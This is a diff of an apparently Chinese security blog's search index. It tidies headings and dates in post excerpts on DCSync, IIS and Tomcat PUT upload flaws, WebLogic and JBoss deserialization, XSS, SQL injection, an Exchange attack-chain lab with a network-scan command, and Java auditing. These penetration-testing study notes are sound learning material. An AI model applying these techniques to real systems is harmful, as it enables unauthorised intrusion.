 <p>​    DCSync 的最大特点，在于不用登录域服务器，即可远程通过<strong>域数据同步复制</strong>的方式获得想要的用户口令信息。</p>
@@ -846,8 +846,7 @@
   <entry>
     <title>DC-2靶机学习</title>
     <url>/2020/04/03/dc-2-ba-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
-<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
+    <content><![CDATA[<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
 <p><img src="/2020/04/03/dc-2-ba-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt></p>
 <p>我们使用netdiscover进行主机发现。</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r <span class="number">192.168</span><span class="number">.153</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
@@ -918,7 +917,7 @@
   <entry>
     <title>IIS中间件漏洞</title>
     <url>/2020/04/03/iis-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h2 id="IIS中间件漏洞复现"><a href="#IIS中间件漏洞复现" class="headerlink" title="IIS中间件漏洞复现"></a>IIS中间件漏洞复现</h2><h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
+    <content><![CDATA[<h4 id="IIS-put漏洞"><a href="#IIS-put漏洞" class="headerlink" title="IIS-put漏洞"></a>IIS-put漏洞</h4><p><strong>什么是IIS？</strong></p>
 <p>  IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
 <h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>​      WebDAV （Web-based Distributed Authoring and Versioning） 是一种HTTP1.1的扩展协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。可以像在操作本地文件夹一样操作服务器上的文件夹，该扩展也存在缺陷，可以被恶意攻击者利用，直接上传恶意文件。</p>
 <h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.准备过程：</p>
@@ -1021,7 +1020,7 @@
   <entry>
     <title>Java安全--RMI基础学习</title>
     <url>/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/</url>
-    <content><![CDATA[<h2 id="java安全学习–RMI学习"><a href="#java安全学习–RMI学习" class="headerlink" title="java安全学习–RMI学习"></a>java安全学习–RMI学习</h2><h3 id="RMI定义"><a href="#RMI定义" class="headerlink" title="RMI定义"></a>RMI定义</h3><ul>
+    <content><![CDATA[<h3 id="RMI定义"><a href="#RMI定义" class="headerlink" title="RMI定义"></a>RMI定义</h3><ul>
 <li>Java远程调用，<strong>实现远程调用的应用程序编程接口</strong>。</li>
 <li>RMI对象是通过<strong>序列化方式</strong>进行编码传输的。</li>
 <li>Java程序远程调用另一台服务器的java对象。</li>
@@ -1338,7 +1337,7 @@
   <entry>
     <title>Java安全--Spring框架基础学习</title>
     <url>/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/</url>
-    <content><![CDATA[<h2 id="Spring框架基础学习"><a href="#Spring框架基础学习" class="headerlink" title="Spring框架基础学习"></a>Spring框架基础学习</h2><h3 id="Spring–IOC"><a href="#Spring–IOC" class="headerlink" title="Spring–IOC"></a>Spring–IOC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>spring的核心思想是IOC和AOP，IoC - Inversion of Control, 控制反转，通俗点说就是把创建和管理bean的过程转移给了第三方。而这个第三方就是我们说的IOC容器。</p>
+    <content><![CDATA[<h3 id="Spring–IOC"><a href="#Spring–IOC" class="headerlink" title="Spring–IOC"></a>Spring–IOC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>spring的核心思想是IOC和AOP，IoC - Inversion of Control, 控制反转，通俗点说就是把创建和管理bean的过程转移给了第三方。而这个第三方就是我们说的IOC容器。</p>
 <p>Spring容器将创建对象,把它们连接在一起,配置它们,并管理他们的整个生命周期从创建到销毁。控制着bean的依赖注入。</p>
 <p><strong>那么这里为什么要叫做控制反转呢?</strong></p>
 <p>我们先来对比下两种不同的获取外部对象的资源的方法。</p>
@@ -1818,7 +1817,7 @@
   <entry>
     <title>SQL注入知识点总结+靶场笔记</title>
     <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
-    <content><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
+    <content><![CDATA[<h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
 <p>​     在schemata表中，schema_name字段用来存储数据库名。</p>
 <p>​     在tables表中，table_schema和table_name分别用来存储数据库名和表名。</p>
 <p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p>
@@ -2130,7 +2129,7 @@
   <entry>
     <title>SRC混子的漏洞挖掘之道</title>
     <url>/2021/01/16/src-hun-zi-de-lou-dong-wa-jue-zhi-dao/</url>
-    <content><![CDATA[<h2 id="SRC混子的漏洞挖掘之道"><a href="#SRC混子的漏洞挖掘之道" class="headerlink" title="SRC混子的漏洞挖掘之道"></a>SRC混子的漏洞挖掘之道</h2><p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p>
+    <content><![CDATA[<p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p>
 <p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p>
 <h3 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h3><p> 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p>
 <h4 id="企业相关信息收集"><a href="#企业相关信息收集" class="headerlink" title="企业相关信息收集"></a>企业相关信息收集</h4><ul>
@@ -2512,7 +2511,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>SSM框架审计学习-- 因酷网校在线教育系统审计</title>
     <url>/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/</url>
-    <content><![CDATA[<h2 id="SSM框架审计学习–-因酷网校在线教育系统审计学习"><a href="#SSM框架审计学习–-因酷网校在线教育系统审计学习" class="headerlink" title="SSM框架审计学习– 因酷网校在线教育系统审计学习"></a>SSM框架审计学习– 因酷网校在线教育系统审计学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p>
 <p>第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：<a href="https://xz.aliyun.com/t/2646" target="_blank" rel="noopener">JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.com)</a></p>
 <h5 id="java分层思想"><a href="#java分层思想" class="headerlink" title="java分层思想"></a>java分层思想</h5><p>常见的JavaWeb项目分层：</p>
 <blockquote>
@@ -2598,7 +2597,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>Tomcat中间件漏洞</title>
     <url>/2020/04/03/tomcat-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
+    <content><![CDATA[<h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
 <h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
 <p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
 <h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
@@ -2647,7 +2646,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>WebLogic XMLDecoder反序列化漏洞学习</title>
     <url>/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/</url>
-    <content><![CDATA[<h1 id="WebLogic-XMLDecoder反序列化漏洞"><a href="#WebLogic-XMLDecoder反序列化漏洞" class="headerlink" title="WebLogic XMLDecoder反序列化漏洞"></a>WebLogic XMLDecoder反序列化漏洞</h1><h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p>
+    <content><![CDATA[<h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p>
 <h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>一般使用的是10.3.6，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。</p>
 <h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    weblogic “wls-wsat”组件在反序列化操作时使用了Oracle官方的JDK组件中”XMLDecoder”类进行XML反序列化操作引发了代码执行。</p>
 <p>XMLDecoder类用于读取使用XMLEncoder创建的XML文档</p>
@@ -2714,7 +2713,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>Weblogic中间件漏洞</title>
     <url>/2020/04/03/weblogic-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h2 id="WebLogic中间件漏洞复现"><a href="#WebLogic中间件漏洞复现" class="headerlink" title="WebLogic中间件漏洞复现"></a>WebLogic中间件漏洞复现</h2><h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+    <content><![CDATA[<h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
 <h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
 <h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>使用vulhub实验环境，启动实验环境，访问靶机，抓包，修改数据包。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png!small" alt="img"></a></p>
@@ -2801,7 +2800,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>XSS漏洞学习</title>
     <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
-    <content><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
+    <content><![CDATA[<h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p>
 <h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul>
 <li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li>
 <li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li>
@@ -3138,8 +3137,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>exchange攻击链复现</title>
     <url>/2021/08/19/exchange-gong-ji-lian-fu-xian/</url>
-    <content><![CDATA[<h2 id="exchange攻击链复现"><a href="#exchange攻击链复现" class="headerlink" title="exchange攻击链复现"></a>exchange攻击链复现</h2><p>[TOC]</p>
-<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="1-域环境搭建"><a href="#1-域环境搭建" class="headerlink" title="1.域环境搭建"></a>1.域环境搭建</h5><p>我们首先需要搭建一个简单的域环境,具体的搭建步骤可以参考:</p>
+    <content><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><h5 id="1-域环境搭建"><a href="#1-域环境搭建" class="headerlink" title="1.域环境搭建"></a>1.域环境搭建</h5><p>我们首先需要搭建一个简单的域环境,具体的搭建步骤可以参考:</p>
 <p><a href="https://www.jianshu.com/p/2708f3dfb7cf" target="_blank" rel="noopener">配置Windows Server 2012域控环境，并抓取hash - 简书 (jianshu.com)</a></p>
 <p>搭建的结果:</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Winserver2012R2      DC域控   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.175</span></span><br><span class="line">Winserver2012R2      exchange服务器   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.185</span></span><br><span class="line">windows <span class="number">10</span> x64       win10成员机(受控机)      ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.143</span></span><br><span class="line"></span><br><span class="line">攻击者kali机   ip:<span class="number">192.168</span><span class="number">.111</span><span class="number">.182</span></span><br></pre></td></tr></table></figure>
@@ -3271,7 +3269,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>golang学习--编写爬虫</title>
     <url>/2021/04/03/golang-xue-xi-bian-xie-pa-chong/</url>
-    <content><![CDATA[<h2 id="golang–从零学习编写一个爬虫"><a href="#golang–从零学习编写一个爬虫" class="headerlink" title="golang–从零学习编写一个爬虫"></a>golang–从零学习编写一个爬虫</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类似jsfinder的爬虫。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    学习了一段时间的go，觉得自己应该实际上手写一些东西，之前一直使用在三只师傅python写的jsfinder,就想着用go写一个类似jsfinder的爬虫。</p>
 <h4 id="steps1"><a href="#steps1" class="headerlink" title="steps1"></a>steps1</h4><p>首先实现简单访问并读取页面内容的功能，主要使用net/http模块。</p>
 <figure class="highlight roboconf"><table><tr><td class="code"><pre><span class="line">func main()&#123;</span><br><span class="line">	<span class="attribute">resp,err</span>:=http<span class="variable">.Get</span>("https://www<span class="variable">.lenovo</span><span class="variable">.com</span><span class="variable">.cn</span>")</span><br><span class="line">	if err!=nil&#123;</span><br><span class="line">		log<span class="variable">.Fatal</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	if resp<span class="variable">.StatusCode</span>!=200 &#123;</span><br><span class="line">		log<span class="variable">.Fatal</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	doc,err:=ioutil<span class="variable">.ReadAll</span>(resp<span class="variable">.Body</span>)</span><br><span class="line">	resp<span class="variable">.Body</span><span class="variable">.Close</span>()</span><br><span class="line">	fmt<span class="variable">.Printf</span>("%s",doc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -3328,7 +3326,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>jBoss中间件漏洞</title>
     <url>/2020/04/03/jboss-zhong-jian-jian-lou-dong/</url>
-    <content><![CDATA[<h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+    <content><![CDATA[<h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
 <h4 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h4><p>这里直接复制了官方文档复现：<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</a></p>
 <p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
 <p>参考：</p>
@@ -3415,9 +3413,8 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   </entry>
   <entry>
     <title>java代码审计之常见漏洞学习</title>
-    <url>/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</url>
-    <content><![CDATA[<p>title: java代码审计之常见漏洞学习<br>abbrlink: 15301<br>date: 2021-01-27 14:28:28<br>tags:</p>
-<h2 id="java代码审计之常见漏洞学习"><a href="#java代码审计之常见漏洞学习" class="headerlink" title="java代码审计之常见漏洞学习"></a>java代码审计之常见漏洞学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Java代码审计中常见的一些漏洞学习总结以及一些审计思路。</p>
+    <url>/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Java代码审计中常见的一些漏洞学习总结以及一些审计思路。</p>
 <h4 id="java项目分层"><a href="#java项目分层" class="headerlink" title="java项目分层"></a>java项目分层</h4><ul>
 <li>视图层(View 视图)</li>
 <li>控制层（Controller、Action控制层)</li>
@@ -3604,9 +3601,9 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
 </ul>
 <h4 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h4><h5 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h5><p>​    <strong>中间件</strong>是提供系统软件和应用软件之间连接的软件，它将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p>
 <p>java常见的中间件:</p>
-<p><img src="/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p><img src="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
 <h4 id="审计方法-7"><a href="#审计方法-7" class="headerlink" title="审计方法"></a>审计方法</h4><p>直接打开pom.xml文件查看其 使用的中间件及其版本，然后到漏洞库里找漏洞即可。</p>
-<img src="/2021/06/18/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/QQ截图20210127114728.png" style="zoom: 50%;">
+<img src="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/QQ截图20210127114728.png" style="zoom: 50%;">
 
 <h5 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h5><p>及时更新项目使用的java中间件的版本。</p>
 <h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><h5 id="成因-8"><a href="#成因-8" class="headerlink" title="成因"></a>成因</h5><p>​    常见的业务逻辑漏洞主要是越权，分为平行越权和垂直越权。在javaweb的各个功能点中都可能存在越权漏洞。</p>
@@ -3629,7 +3626,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>java学习--反射机制</title>
     <url>/2020/11/25/java-xue-xi-fan-she-ji-zhi/</url>
-    <content><![CDATA[<h2 id="Java学习–java反射机制"><a href="#Java学习–java反射机制" class="headerlink" title="Java学习–java反射机制"></a>Java学习–java反射机制</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p>
 <h3 id="反射的具体使用步骤"><a href="#反射的具体使用步骤" class="headerlink" title="反射的具体使用步骤"></a>反射的具体使用步骤</h3><p>在调用<code>Java</code>反射机制，主要步骤包括：</p>
 <ul>
 <li>获取 目标类型的<code>Class</code>对象.</li>
@@ -3696,7 +3693,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>java安全--FastJson 1.2.22-1.2.24漏洞分析</title>
     <url>/2021/03/02/java-an-quan-fastjson-1-2-22-1-2-24-lou-dong-fen-xi/</url>
